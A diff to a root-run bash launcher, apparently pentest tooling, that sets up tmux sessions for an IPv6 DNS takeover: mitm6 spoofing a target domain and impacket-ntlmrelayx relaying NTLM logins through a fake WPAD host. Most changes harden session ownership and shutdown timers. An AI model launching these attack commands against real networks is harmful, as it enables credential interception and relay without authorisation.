@@ -113,9 +113,14 @@ if [[ "$mode" == status || "$mode" == attach || "$mode" == stop ]]; then
   (( EUID == 0 )) || fail 'Run this script as root.'
   sessions=()
   session_ids=()
-  listing=$(tmux list-sessions -F '#{session_id} #{session_name}' 2>/dev/null) || listing=""
-  while IFS=' ' read -r id name; do
-    [[ "$name" == ipv6_dns_takeover_* ]] || continue
+  if ! listing=$(LC_ALL=C tmux list-sessions -F '#{session_id} #{@hexahavoc_owned} #{session_name}' 2>&1); then
+    case "$listing" in
+      'no server running on '*|'error connecting to '*' (No such file or directory)') listing="" ;;
+      *) fail "Could not list tmux sessions: $listing" ;;
+    esac
+  fi
+  while IFS=' ' read -r id owned name; do
+    [[ "$owned" == 1 ]] || continue
     [[ -z "$selected_session" || "$name" == "$selected_session" ]] || continue
     sessions+=("$name")
     session_ids+=("$id")
@@ -211,17 +216,10 @@ safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
 session_name="ipv6_dns_takeover_${safe_domain}"
 session_target="=$session_name"
 
-# Do not claim ownership of an existing session or kill it on an unrelated error.
-if tmux has-session -t "=$session_name" 2>/dev/null; then
-  [[ -z "$duration" ]] || fail '--duration applies only to a new session; stop the existing session first.'
-  [[ -t 0 && -t 1 ]] || fail "Session $session_name already exists; manage it with tmux."
-  printf 'Session %s exists. Attach [a] or kill and exit [k]: ' "$session_name"
-  read -r user_choice || fail 'No session choice received.'
-  case "$user_choice" in
-    a|A) tmux attach-session -t "=$session_name"; exit $? ;;
-    k|K) tmux kill-session -t "=$session_name"; exit $? ;;
-    *) fail 'Expected a or k.' ;;
-  esac
+# Existing sessions must be managed through the ownership-checked controls.
+if tmux has-session -t "$session_target" 2>/dev/null; then
+  [[ -z "$duration" ]] || fail '--duration applies only to a new session.'
+  fail "Session name $session_name is already in use. Use --status to find managed sessions."
 fi
 [[ -t 0 && -t 1 ]] || fail 'An interactive terminal is required to attach to tmux.'
 [[ -z "${TMUX:-}" ]] || fail 'Run this launcher outside tmux to avoid a nested attachment.'
@@ -264,23 +262,6 @@ logged_command() {
   ' hexahavoc-log "$@"
 }
 
-log "Creating session $session_name..."
-# The logging wrapper exits with its pipeline; no interactive shell stays open.
-mitm_command=$(logged_command "$mitm_log" mitm6 -i "$interface" -d "$target_domain")
-mitm_pane=$(tmux new-session -d -P -F '#{pane_id}' -s "$session_name" -n tools "$mitm_command")
-created_session=1
-# Use the immutable session ID so a later same-name session is never targeted.
-owned_session_id=$(tmux display-message -p -t "$mitm_pane" '#{session_id}')
-session_target=$owned_session_id
-if [[ -n "$duration" ]]; then
-  deadline=$((SECONDS + duration))
-  # A session-owned timer survives client detach and is closed with the session.
-  # No login shell or interactive prompt remains after the timer command exits.
-  timer_command=$(shell_command /bin/bash -c 'sleep "$1" && exec tmux kill-session -t "$2"' hexahavoc-timer "$duration" "$session_target")
-  tmux new-window -d -t "$session_target" -n duration "$timer_command"
-  log "This session will close automatically after $duration seconds, even if detached."
-fi
-
 finish_if_expired() {
   if [[ -n "$duration" ]] && (( SECONDS >= deadline )) &&
      ! tmux has-session -t "$session_target" 2>/dev/null; then
@@ -288,12 +269,6 @@ finish_if_expired() {
     keep_session=1
     exit 0
   fi
-}
-
-relay_command=$(logged_command "$relay_log" impacket-ntlmrelayx -6 -t "$relay_target" -wh "fakewpad.$target_domain" -l "$run_dir")
-relay_pane=$(tmux split-window -h -d -P -F '#{pane_id}' -t "$mitm_pane" "$relay_command") || {
-  finish_if_expired
-  fail 'Could not create the ntlmrelayx pane.'
 }
 
 check_pane() {
@@ -307,6 +282,45 @@ check_pane() {
     fail "$2 exited during startup."
   fi
 }
+
+log "Creating session $session_name..."
+# The logging wrapper exits with its pipeline; no interactive shell stays open.
+mitm_command=$(logged_command "$mitm_log" mitm6 -i "$interface" -d "$target_domain")
+session_info=$(tmux new-session -d -P -F '#{session_id} #{pane_id}' -s "$session_name" -n tools "$mitm_command")
+# Use the immutable session ID so a later same-name session is never targeted.
+IFS=' ' read -r session_target mitm_pane <<< "$session_info"
+created_session=1
+tmux set-option -t "$session_target" @hexahavoc_owned 1
+if [[ -n "$duration" ]]; then
+  deadline=$((SECONDS + duration))
+  shutdown_command="kill-session -t $session_target"
+  # A closed timer window must stop the run even when no client is attached.
+  tmux set-hook -t "$session_target" window-unlinked "$shutdown_command"
+  # A session-owned timer survives client detach and is closed with the session.
+  # No login shell or interactive prompt remains after the timer command exits.
+  timer_command=$(shell_command /bin/bash -c 'sleep "$1" && exec tmux kill-session -t "$2"' hexahavoc-timer "$duration" "$session_target")
+  timer_info=$(tmux new-window -d -P -F '#{window_id} #{pane_id}' -t "$session_target" -n duration "$timer_command") || {
+    finish_if_expired
+    fail 'Could not create the shutdown timer.'
+  }
+  IFS=' ' read -r timer_window timer_pane <<< "$timer_info"
+  # pane-died also handles dead panes retained by remain-on-exit.
+  for event in pane-exited pane-died; do
+    tmux set-hook -w -t "$timer_window" "$event" "$shutdown_command" || {
+      finish_if_expired
+      fail 'Could not install the shutdown timer hook.'
+    }
+  done
+  check_pane "$timer_pane" 'Shutdown timer'
+  log "This session will close automatically after $duration seconds, even if detached."
+fi
+
+relay_command=$(logged_command "$relay_log" impacket-ntlmrelayx -6 -t "$relay_target" -wh "fakewpad.$target_domain" -l "$run_dir")
+relay_pane=$(tmux split-window -h -d -P -F '#{pane_id}' -t "$mitm_pane" "$relay_command") || {
+  finish_if_expired
+  fail 'Could not create the ntlmrelayx pane.'
+}
+
 # These are session-owned process liveness checks, not service readiness checks.
 for _ in 1 2 3; do
   sleep 1
